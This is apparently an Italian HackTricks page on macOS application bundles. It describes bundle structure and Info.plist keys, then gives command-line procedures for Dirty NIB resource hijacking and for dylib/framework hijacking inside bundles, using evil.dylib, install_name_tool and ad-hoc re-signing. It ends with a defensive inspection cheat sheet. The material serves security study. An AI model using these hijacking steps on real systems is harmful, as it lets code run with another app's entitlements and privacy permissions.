# Bundle macOS

{{#include ../../../banners/hacktricks-training.md}}

## Informazioni di base

I bundle in macOS fungono da contenitori per diverse risorse, tra cui applicazioni, librerie e altri file necessari, facendoli apparire come singoli oggetti nel Finder, come i familiari file `*.app`. Il bundle più comune è il bundle `.app`, anche se sono diffusi anche altri tipi, come `.framework`, `.systemextension` e `.kext`.

### Componenti essenziali di un bundle

All'interno di un bundle, in particolare nella directory `<application>.app/Contents/`, sono contenute diverse risorse importanti:

- **\_CodeSignature**: questa directory memorizza i dettagli della firma del codice, fondamentali per verificare l'integrità dell'applicazione. È possibile esaminare le informazioni sulla firma del codice usando comandi come:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Contiene il binary eseguibile dell'applicazione che viene eseguito in seguito all'interazione dell'utente.
- **Resources**: Un repository per i componenti dell'interfaccia utente dell'applicazione, incluse immagini, documenti e descrizioni dell'interfaccia (file nib/xib).
- **Info.plist**: Funziona come file di configurazione principale dell'applicazione, fondamentale affinché il sistema riconosca e interagisca correttamente con l'applicazione.

#### Chiavi importanti in Info.plist

Il file `Info.plist` è un elemento fondamentale per la configurazione dell'applicazione e contiene chiavi come:

- **CFBundleExecutable**: Specifica il nome del file eseguibile principale situato nella directory `Contents/MacOS`.
- **CFBundleIdentifier**: Fornisce un identificatore globale per l'applicazione, utilizzato ampiamente da macOS per la gestione delle applicazioni.
- **LSMinimumSystemVersion**: Indica la versione minima di macOS richiesta per eseguire l'applicazione.

### Esplorazione dei Bundles

Per esplorare il contenuto di un bundle, come `Safari.app`, è possibile utilizzare il seguente comando: `bash ls -lR /Applications/Safari.app/Contents`

Questa esplorazione mostra directory come `_CodeSignature`, `MacOS`, `Resources` e file come `Info.plist`, ognuno dei quali svolge una funzione specifica, dalla protezione dell'applicazione alla definizione della sua interfaccia utente e dei parametri operativi.

#### Directory aggiuntive dei Bundles

Oltre alle directory comuni, i bundles possono includere anche:

- **Frameworks**: Contiene i framework inclusi utilizzati dall'applicazione. I framework sono simili alle dylib, ma con risorse aggiuntive.
- **PlugIns**: Una directory per plug-in ed estensioni che ampliano le funzionalità dell'applicazione.
- **XPCServices**: Contiene i servizi XPC utilizzati dall'applicazione per la comunicazione out-of-process.

Questa struttura garantisce che tutti i componenti necessari siano incapsulati nel bundle, facilitando un ambiente applicativo modulare e sicuro.

Per informazioni più dettagliate sulle chiavi `Info.plist` e sui loro significati, la documentazione per sviluppatori Apple offre numerose risorse: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Note di sicurezza e vettori di abuso

- **Gatekeeper / App Translocation**: Quando un bundle in quarantena viene eseguito per la prima volta, macOS effettua una verifica approfondita della firma e può eseguirlo da un percorso translocated casuale. Dopo l'accettazione, gli avvii successivi eseguono solo controlli superficiali; storicamente, i file di risorse in `Resources/`, `PlugIns/`, i nib, ecc. non venivano verificati. A partire da macOS 13 Ventura viene applicato un controllo approfondito alla prima esecuzione e il nuovo permesso TCC *App Management* limita la possibilità dei processi di terze parti di modificare altri bundles senza il consenso dell'utente, ma i sistemi meno recenti rimangono vulnerabili.
- **Collisioni degli identificatori dei Bundles**: Più target incorporati (PlugIns, helper tools) che riutilizzano lo stesso `CFBundleIdentifier` possono interrompere la validazione della firma e occasionalmente consentire il dirottamento o la confusione degli URL scheme. Enumerare sempre i sub-bundles e verificare l'unicità degli ID.

## Resource Hijacking (Dirty NIB / NIB Injection)

Prima di Ventura, sostituire le risorse dell'interfaccia utente in un'app firmata poteva bypassare la code signing superficiale e consentire l'esecuzione di codice con gli entitlement dell'applicazione. Le ricerche attuali (2024) mostrano che questo funziona ancora sui sistemi precedenti a Ventura e sulle build non in quarantena:<sup>[1][2]</sup>

1. Copiare l'applicazione target in una posizione scrivibile (ad esempio, `/tmp/Victim.app`).
2. Sostituire `Contents/Resources/MainMenu.nib` (o qualsiasi nib dichiarato in `NSMainNibFile`) con uno dannoso che istanzia `NSAppleScript`, `NSTask`, ecc.
3. Avviare l'applicazione. Il nib dannoso viene eseguito con il bundle ID e gli entitlement della vittima (concessioni TCC, microfono/fotocamera, ecc.).
4. Ventura+ mitiga il problema verificando in profondità il bundle al primo avvio e richiedendo il permesso *App Management* per le modifiche successive; la persistenza è quindi più difficile, ma gli attacchi al primo avvio sui sistemi macOS meno recenti rimangono applicabili.<sup>[1]</sup>

Esempio minimo di payload nib dannoso (compilare xib in nib con `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking inside Bundles

Poiché le ricerche `@rpath` danno priorità ai Frameworks/PlugIns inclusi nel bundle, inserire una libreria malevola in `Contents/Frameworks/` o `Contents/PlugIns/` può reindirizzare l'ordine di caricamento quando il binario principale è firmato senza library validation o con un ordinamento debole di `LC_RPATH`.

Passaggi tipici quando si sfrutta un bundle unsigned/ad-hoc:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Note:
- Il hardened runtime con `com.apple.security.cs.disable-library-validation` assente blocca i dylib di terze parti; verifica prima gli entitlements.
- I servizi XPC in `Contents/XPCServices/` spesso caricano framework sibling: esegui il patch dei loro binary in modo analogo per ottenere persistence o percorsi di privilege escalation.

## Cheat sheet per l'ispezione rapida
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Riferimenti

- [1] [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB & bundle resource tampering write-up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)

{{#include ../../../banners/hacktricks-training.md}}
